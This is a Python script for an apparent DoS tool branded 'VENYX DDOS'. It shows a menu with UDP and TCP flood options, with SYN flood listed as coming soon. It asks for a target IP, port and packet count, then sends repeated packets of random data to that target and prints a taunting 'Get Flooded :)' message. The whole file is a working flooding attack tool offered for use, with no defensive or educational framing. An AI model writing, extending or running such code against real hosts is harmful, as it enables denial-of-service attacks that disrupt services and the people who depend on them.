import socket
import os
import fade
from pystyle import Center
import colorama
from colorama import Fore

# Random data generation for payload
random_data = os.urandom(640)

# ASCII Art and Menu
font = """
 ██▒   █▓▓█████  ███▄    █▓██   ██▓▒██   ██▒   ▓█████▄ ▓█████▄  ▒█████    ██████ 
▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██  ██▒▒▒ █ █ ▒░   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
 ▓██  █▒░▒███   ▓██  ▀█ ██▒ ▒██ ██░░░  █   ░   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒ ░ ▐██▓░ ░ █ █ ▒    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
   ▒▀█░  ░▒████▒▒██░   ▓██░ ░ ██▒▓░▒██▒ ▒██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒   ██▒▒▒ ▒▒ ░ ░▓ ░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░▓██ ░▒░ ░░   ░▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
     ░░     ░      ░   ░ ░ ░ ▒ ▒ ░░   ░    ░      ░ ░  ░  ░ ░  ░ ░ ░ ▒  ░  ░  ░  
      ░     ░  ░         ░ ░ ░      ░    ░        ░       ░        ░ ░        ░  
     ░                     ░ ░                  ░       ░                         
"""
print(Center.XCenter(fade.purplepink(font)))
print(Center.XCenter(fade.greenblue("─══════════════════════════☆☆☆══════════════════════════─")))
print(Center.XCenter(fade.pinkred('[1] UDP Flood')))
print(Center.XCenter(fade.pinkred('[2] TCP Flood')))
print(Center.XCenter(fade.pinkred(' [3] SYN Flood (Coming Soon)')))
print(Center.XCenter(fade.greenblue("─══════════════════════════☆☆☆══════════════════════════─")))

# Menu Choice
choice = input("\n Enter Choice └─> ")

# UDP Flood Functionality
def udp_flood(ip, port, packets):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_data = f"Get Flooded :)  └─> {random_data}".encode()

        for i in range(packets):
            try:
                sock.sendto(packet_data, (ip, port))
                print(f"{Fore.WHITE}({Fore.GREEN}+{Fore.WHITE}) └─> {Fore.LIGHTMAGENTA_EX}Packet └─> {Fore.MAGENTA}{i + 1} "
                      f"{Fore.LIGHTMAGENTA_EX} └─> Sent To └─> {Fore.MAGENTA}{ip}{Fore.LIGHTCYAN_EX} | {Fore.GREEN}Success")
            except Exception as e:
                print(f"{Fore.WHITE}({Fore.RED}!{Fore.WHITE}) └─> {Fore.LIGHTMAGENTA_EX}Packet └─> {Fore.MAGENTA}{i + 1} "
                      f"{Fore.LIGHTMAGENTA_EX} └─> Failed └─> {Fore.MAGENTA}{ip}{Fore.LIGHTCYAN_EX} | {Fore.RED}Failed ({e})")
        sock.close()
    except Exception as e:
        print(fade.pinkred(f"Unexpected error: {e}"))

# TCP Flood Functionality
def tcp_flood(ip, port, packets):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        print(f"Connected to {ip}:{port}")

        for i in range(packets):
            try:
                sock.sendall(f"TCP Flood Test: {random_data}".encode())
                print(f"{Fore.WHITE}({Fore.GREEN}+{Fore.WHITE}) └─> {Fore.LIGHTMAGENTA_EX}Packet └─> {Fore.MAGENTA}{i + 1} "
                      f"{Fore.LIGHTMAGENTA_EX} └─> Sent To └─> {Fore.MAGENTA}{ip}{Fore.LIGHTCYAN_EX} | {Fore.GREEN}Success")
            except Exception as e:
                print(f"{Fore.WHITE}({Fore.RED}!{Fore.WHITE}) └─> {Fore.LIGHTMAGENTA_EX}Packet └─> {Fore.MAGENTA}{i + 1} "
                      f"{Fore.LIGHTMAGENTA_EX} └─> Failed └─> {Fore.MAGENTA}{ip}{Fore.LIGHTCYAN_EX} | {Fore.RED}Failed ({e})")
        sock.close()
    except Exception as e:
        print(fade.pinkred(f"Unexpected error: {e}"))

# Main Logic
if choice == "1":
    try:
        ip = input(Fore.LIGHTGREEN_EX + "IP: ")
        port = int(input(Fore.LIGHTGREEN_EX + "Port: "))
        packets = int(input(Fore.LIGHTGREEN_EX + "Packets: "))
        udp_flood(ip, port, packets)
    except ValueError:
        print(fade.pinkred("Invalid input. Please enter numeric values for Port and Packets."))

elif choice == "2":
    try:
        ip = input(Fore.LIGHTGREEN_EX + "IP: ")
        port = int(input(Fore.LIGHTGREEN_EX + "Port: "))
        packets = int(input(Fore.LIGHTGREEN_EX + "Packets: "))
        tcp_flood(ip, port, packets)
    except ValueError:
        print(fade.pinkred("Invalid input. Please enter numeric values for Port and Packets."))

elif choice == "3":
    print(fade.pinkred("SYN Flood functionality coming soon."))

else:
    print(fade.pinkred("Invalid choice. Please select a valid option."))